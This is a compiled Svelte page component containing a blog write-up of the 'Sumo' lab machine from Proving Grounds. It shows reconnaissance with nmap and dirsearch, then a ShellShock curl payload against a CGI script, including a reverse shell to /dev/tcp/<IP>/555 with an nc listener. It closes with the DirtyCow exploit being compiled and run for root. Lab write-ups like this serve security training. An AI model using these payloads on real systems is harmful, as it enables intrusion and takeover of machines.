import{S as cl,i as dl,s as nl,U as kt,y as fl,z as ul,A as pl,V as vl,W as Mt,g as hl,d as ml,B as _l,X as Yt,k as r,q as i,a as u,Y as C,e as Jt,l as c,m as d,r as o,h as t,c as p,Z as O,n as b,b as a,D as l,E as wl}from"../chunks/index.725d15e1.js";import{P as El}from"../chunks/post_layout.16305f07.js";function bl(L){let f,v,y,F,n,m,x,$e,Be,Ee,S,T,Ge,be,H,Xe,ye,Z,el=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">nmap -Pn -sV -T4 192.168.1.48</span></div></code></div></pre>`,K,_,je,V,Re,Ue,W,Ze,Ke,Fe,k,Ve,z,We,ze,xe,M,tl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">python3 dirsearch --url https://192.168.1.120</span></div></code></div></pre>`,Y,w,Me,J,Ye,Je,Q,Qe,et,ke,D,q,tt,Pe,N,$,lt,Ie,h,st,ee,it,ot,te,at,rt,le,ct,dt,Ae,se,ll=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">curl -H ‘User-Agent: () &#123; :; &#125;; whoami; pwd; pwd’ http://192.168.124.87/cgi-bin/test.sh</span></div></code></div></pre>`,ie,B,nt,Ce,oe,sl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">## Listening</span></div><div class='line'><span style="color: undefined">nc -lvnp 555</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">## Target execution</span></div><div class='line'><span style="color: undefined">curl -H ‘User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;& /dev/tcp/&lt;IP&gt;/555 0&gt;&1’ http://192.168.XX.XX/cgi-bin/test.sh</span></div></code></div></pre>`,ae,P,ft,re,ut,pt,Oe,ce,il=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">cat ./local.txt</span></div></code></div></pre>`,de,g,G,vt,Se,X,ht,De,ne,ol=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">hostnamectl  ## Game me no output</span></div><div class='line'><span style="color: undefined">uname -a</span></div></code></div></pre>`,fe,I,mt,ue,_t,wt,Ne,pe,al=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">gcc dirtycow.c -o dcow -pthread -static</span></div></code></div></pre>`,ve,E,Et,he,bt,yt,me,Ft,xt,ge,_e,rl=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">chmod +x ./dcow</span></div><div class='line'><span style="color: undefined">./dcow</span></div></code></div></pre>`,we;return{c(){f=r("h2"),v=r("a"),y=i("Introduction"),F=u(),n=r("p"),m=i("Sumo is a machine available on vulnhub and offsec proving grounds labeled "),x=r("strong"),$e=i("easy"),Be=i(" and covers 0-day exploits discovered in the past. The machine hosts a website and has 2 flags to be submitted."),Ee=u(),S=r("h2"),T=r("a"),Ge=i("Recon"),be=u(),H=r("p"),Xe=i("After getting the IP of the machine, ran a basic nmap scan on the target machine:"),ye=u(),Z=new C(!1),K=u(),_=r("p"),je=i("The disovered open ports are "),V=r("code"),Re=i("80"),Ue=i(" and "),W=r("code"),Ze=i("22"),Ke=i(". Lets visit the website first."),Fe=u(),k=r("p"),Ve=i("Next thing, i brute forced into the website using "),z=r("code"),We=i("dirsearch"),ze=i(":"),xe=u(),M=new C(!1),Y=u(),w=r("p"),Me=i("I found the "),J=r("code"),Ye=i("CGI-BIN"),Je=i(" endpoint. And from the nmap output, we know the version of apache is "),Q=r("code"),Qe=i("2.2.22"),et=i(" which is quite an old version."),ke=u(),D=r("h2"),q=r("a"),tt=i("Exploitation"),Pe=u(),N=r("h3"),$=r("a"),lt=i("Initial Access"),Ie=u(),h=r("p"),st=i("Now, duringthe brute force phase, i also discovered the "),ee=r("code"),it=i("test"),ot=i(" script under the "),te=r("code"),at=i("CGI-BIN"),rt=i(" folder. Since, we know the system is old, lets try the famous "),le=r("code"),ct=i("ShellShock"),dt=i(" exploit:"),Ae=u(),se=new C(!1),ie=u(),B=r("p"),nt=i("And we got the output back. Lets escalate it to a shell:"),Ce=u(),oe=new C(!1),ae=u(),P=r("p"),ft=i("And we got the shell. Our first flag is in "),re=r("code"),ut=i("local.txt"),pt=i(" file:"),Oe=u(),ce=new C(!1),de=u(),g=r("h3"),G=r("a"),vt=i("Privilege Escalation"),Se=u(),X=r("p"),ht=i("Next, we need to escalate it to the root user. So, we can get the other flag as well. Lets get the system version first:"),De=u(),ne=new C(!1),fe=u(),I=r("p"),mt=i("Hmmm, the linux version seems to be quite old. Now, just like before, the local exploit that came quickly to mind after the shellshoch was "),ue=r("code"),_t=i("dirtycow"),wt=i(". Lets get a public version of it. Compiling it:"),Ne=u(),pe=new C(!1),ve=u(),E=r("p"),Et=i("I used the "),he=r("code"),bt=i("-static"),yt=i(" flag to statically compile the glibc libraries with the binary. Otherwise, you would run into the libraries issue since the system was quite old and i was on "),me=r("code"),Ft=i("Kali 2023.1"),xt=i(". Lets execute the binary:"),ge=u(),_e=new C(!1),we=Jt(),this.h()},l(e){f=c(e,"H2",{id:!0});var s=d(f);v=c(s,"A",{href:!0});var Pt=d(v);y=o(Pt,"Introduction"),Pt.forEach(t),s.forEach(t),F=p(e),n=c(e,"P",{});var Le=d(n);m=o(Le,"Sumo is a machine available on vulnhub and offsec proving grounds labeled "),x=c(Le,"STRONG",{});var It=d(x);$e=o(It,"easy"),It.forEach(t),Be=o(Le," and covers 0-day exploits discovered in the past. The machine hosts a website and has 2 flags to be submitted."),Le.forEach(t),Ee=p(e),S=c(e,"H2",{id:!0});var At=d(S);T=c(At,"A",{href:!0});var Ct=d(T);Ge=o(Ct,"Recon"),Ct.forEach(t),At.forEach(t),be=p(e),H=c(e,"P",{});var Ot=d(H);Xe=o(Ot,"After getting the IP of the machine, ran a basic nmap scan on the target machine:"),Ot.forEach(t),ye=p(e),Z=O(e,!1),K=p(e),_=c(e,"P",{});var j=d(_);je=o(j,"The disovered open ports are "),V=c(j,"CODE",{});var St=d(V);Re=o(St,"80"),St.forEach(t),Ue=o(j," and "),W=c(j,"CODE",{});var Dt=d(W);Ze=o(Dt,"22"),Dt.forEach(t),Ke=o(j,". Lets visit the website first."),j.forEach(t),Fe=p(e),k=c(e,"P",{});var Te=d(k);Ve=o(Te,"Next thing, i brute forced into the website using "),z=c(Te,"CODE",{});var Nt=d(z);We=o(Nt,"dirsearch"),Nt.forEach(t),ze=o(Te,":"),Te.forEach(t),xe=p(e),M=O(e,!1),Y=p(e),w=c(e,"P",{});var R=d(w);Me=o(R,"I found the "),J=c(R,"CODE",{});var gt=d(J);Ye=o(gt,"CGI-BIN"),gt.forEach(t),Je=o(R," endpoint. And from the nmap output, we know the version of apache is "),Q=c(R,"CODE",{});var Lt=d(Q);Qe=o(Lt,"2.2.22"),Lt.forEach(t),et=o(R," which is quite an old version."),R.forEach(t),ke=p(e),D=c(e,"H2",{id:!0});var Tt=d(D);q=c(Tt,"A",{href:!0});var Ht=d(q);tt=o(Ht,"Exploitation"),Ht.forEach(t),Tt.forEach(t),Pe=p(e),N=c(e,"H3",{id:!0});var qt=d(N);$=c(qt,"A",{href:!0});var $t=d($);lt=o($t,"Initial Access"),$t.forEach(t),qt.forEach(t),Ie=p(e),h=c(e,"P",{});var A=d(h);st=o(A,"Now, duringthe brute force phase, i also discovered the "),ee=c(A,"CODE",{});var Bt=d(ee);it=o(Bt,"test"),Bt.forEach(t),ot=o(A," script under the "),te=c(A,"CODE",{});var Gt=d(te);at=o(Gt,"CGI-BIN"),Gt.forEach(t),rt=o(A," folder. Since, we know the system is old, lets try the famous "),le=c(A,"CODE",{});var Xt=d(le);ct=o(Xt,"ShellShock"),Xt.forEach(t),dt=o(A," exploit:"),A.forEach(t),Ae=p(e),se=O(e,!1),ie=p(e),B=c(e,"P",{});var jt=d(B);nt=o(jt,"And we got the output back. Lets escalate it to a shell:"),jt.forEach(t),Ce=p(e),oe=O(e,!1),ae=p(e),P=c(e,"P",{});var He=d(P);ft=o(He,"And we got the shell. Our first flag is in "),re=c(He,"CODE",{});var Rt=d(re);ut=o(Rt,"local.txt"),Rt.forEach(t),pt=o(He," file:"),He.forEach(t),Oe=p(e),ce=O(e,!1),de=p(e),g=c(e,"H3",{id:!0});var Ut=d(g);G=c(Ut,"A",{href:!0});var Zt=d(G);vt=o(Zt,"Privilege Escalation"),Zt.forEach(t),Ut.forEach(t),Se=p(e),X=c(e,"P",{});var Kt=d(X);ht=o(Kt,"Next, we need to escalate it to the root user. So, we can get the other flag as well. Lets get the system version first:"),Kt.forEach(t),De=p(e),ne=O(e,!1),fe=p(e),I=c(e,"P",{});var qe=d(I);mt=o(qe,"Hmmm, the linux version seems to be quite old. Now, just like before, the local exploit that came quickly to mind after the shellshoch was "),ue=c(qe,"CODE",{});var Vt=d(ue);_t=o(Vt,"dirtycow"),Vt.forEach(t),wt=o(qe,". Lets get a public version of it. Compiling it:"),qe.forEach(t),Ne=p(e),pe=O(e,!1),ve=p(e),E=c(e,"P",{});var U=d(E);Et=o(U,"I used the "),he=c(U,"CODE",{});var Wt=d(he);bt=o(Wt,"-static"),Wt.forEach(t),yt=o(U," flag to statically compile the glibc libraries with the binary. Otherwise, you would run into the libraries issue since the system was quite old and i was on "),me=c(U,"CODE",{});var zt=d(me);Ft=o(zt,"Kali 2023.1"),zt.forEach(t),xt=o(U,". Lets execute the binary:"),U.forEach(t),ge=p(e),_e=O(e,!1),we=Jt(),this.h()},h(){b(v,"href","#introduction"),b(f,"id","introduction"),b(T,"href","#recon"),b(S,"id","recon"),Z.a=K,M.a=Y,b(q,"href","#exploitation"),b(D,"id","exploitation"),b($,"href","#initial-access"),b(N,"id","initial-access"),se.a=ie,oe.a=ae,ce.a=de,b(G,"href","#privilege-escalation"),b(g,"id","privilege-escalation"),ne.a=fe,pe.a=ve,_e.a=we},m(e,s){a(e,f,s),l(f,v),l(v,y),a(e,F,s),a(e,n,s),l(n,m),l(n,x),l(x,$e),l(n,Be),a(e,Ee,s),a(e,S,s),l(S,T),l(T,Ge),a(e,be,s),a(e,H,s),l(H,Xe),a(e,ye,s),Z.m(el,e,s),a(e,K,s),a(e,_,s),l(_,je),l(_,V),l(V,Re),l(_,Ue),l(_,W),l(W,Ze),l(_,Ke),a(e,Fe,s),a(e,k,s),l(k,Ve),l(k,z),l(z,We),l(k,ze),a(e,xe,s),M.m(tl,e,s),a(e,Y,s),a(e,w,s),l(w,Me),l(w,J),l(J,Ye),l(w,Je),l(w,Q),l(Q,Qe),l(w,et),a(e,ke,s),a(e,D,s),l(D,q),l(q,tt),a(e,Pe,s),a(e,N,s),l(N,$),l($,lt),a(e,Ie,s),a(e,h,s),l(h,st),l(h,ee),l(ee,it),l(h,ot),l(h,te),l(te,at),l(h,rt),l(h,le),l(le,ct),l(h,dt),a(e,Ae,s),se.m(ll,e,s),a(e,ie,s),a(e,B,s),l(B,nt),a(e,Ce,s),oe.m(sl,e,s),a(e,ae,s),a(e,P,s),l(P,ft),l(P,re),l(re,ut),l(P,pt),a(e,Oe,s),ce.m(il,e,s),a(e,de,s),a(e,g,s),l(g,G),l(G,vt),a(e,Se,s),a(e,X,s),l(X,ht),a(e,De,s),ne.m(ol,e,s),a(e,fe,s),a(e,I,s),l(I,mt),l(I,ue),l(ue,_t),l(I,wt),a(e,Ne,s),pe.m(al,e,s),a(e,ve,s),a(e,E,s),l(E,Et),l(E,he),l(he,bt),l(E,yt),l(E,me),l(me,Ft),l(E,xt),a(e,ge,s),_e.m(rl,e,s),a(e,we,s)},p:wl,d(e){e&&t(f),e&&t(F),e&&t(n),e&&t(Ee),e&&t(S),e&&t(be),e&&t(H),e&&t(ye),e&&Z.d(),e&&t(K),e&&t(_),e&&t(Fe),e&&t(k),e&&t(xe),e&&M.d(),e&&t(Y),e&&t(w),e&&t(ke),e&&t(D),e&&t(Pe),e&&t(N),e&&t(Ie),e&&t(h),e&&t(Ae),e&&se.d(),e&&t(ie),e&&t(B),e&&t(Ce),e&&oe.d(),e&&t(ae),e&&t(P),e&&t(Oe),e&&ce.d(),e&&t(de),e&&t(g),e&&t(Se),e&&t(X),e&&t(De),e&&ne.d(),e&&t(fe),e&&t(I),e&&t(Ne),e&&pe.d(),e&&t(ve),e&&t(E),e&&t(ge),e&&t(we),e&&_e.d()}}}function yl(L){let f,v;const y=[L[0],Qt];let F={$$slots:{default:[bl]},$$scope:{ctx:L}};for(let n=0;n<y.length;n+=1)F=kt(F,y[n]);return f=new El({props:F}),{c(){fl(f.$$.fragment)},l(n){ul(f.$$.fragment,n)},m(n,m){pl(f,n,m),v=!0},p(n,[m]){const x=m&1?vl(y,[m&1&&Mt(n[0]),m&0&&Mt(Qt)]):{};m&2&&(x.$$scope={dirty:m,ctx:n}),f.$set(x)},i(n){v||(hl(f.$$.fragment,n),v=!0)},o(n){ml(f.$$.fragment,n),v=!1},d(n){_l(f,n)}}}const Qt={title:"Writeup for Lab SUMO (Proving Grounds",categories:["Bug Bounty","Projects"],summary:"This is the writeup for sumo lab from proving grounds",created:"2023-07-20T00:00:00.000Z",lastmod:"2023-07-20T00:00:00.000Z",flags:[],updated:"2023-07-22T00:44:35.541Z",slug:"/blog/2023/pgrounds/sumo-easy-writeup/+page.md",path:"/blog/2023/pgrounds/sumo-easy-writeup",toc:[{depth:2,title:"Introduction",slug:"introduction"},{depth:2,title:"Recon",slug:"recon"},{depth:2,title:"Exploitation",slug:"exploitation"},{depth:3,title:"Initial Access",slug:"initial-access"},{depth:3,title:"Privilege Escalation",slug:"privilege-escalation"}]};function Fl(L,f,v){return L.$$set=y=>{v(0,f=kt(kt({},f),Yt(y)))},f=Yt(f),[f]}class Pl extends cl{constructor(f){super(),dl(this,f,Fl,yl,nl,{})}}export{Pl as component};
